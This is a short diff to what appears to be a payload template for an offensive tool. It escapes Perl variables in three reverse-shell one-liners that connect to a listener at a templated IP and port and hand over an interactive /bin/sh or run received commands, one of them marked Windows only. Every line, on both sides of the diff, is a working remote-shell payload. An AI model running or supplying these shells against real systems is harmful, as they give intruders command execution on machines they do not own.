@@ -1,6 +1,6 @@
-perl -e 'use Socket;$i="$local_ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$$i="$local_ip";$$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($$p,inet_aton($$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
-perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"$local_ip:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+perl -MIO -e '$$p=fork;exit,if($$p);$$c=new IO::Socket::INET(PeerAddr,"$local_ip:$port");STDIN->fdopen($$c,r);$$~->fdopen($$c,w);system$$_ while<>;'
 
 # Windows only
-perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$local_ip:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+perl -MIO -e '$$c=new IO::Socket::INET(PeerAddr,"$local_ip:$port");STDIN->fdopen($$c,r);$$~->fdopen($$c,w);system$$_ while<>;'
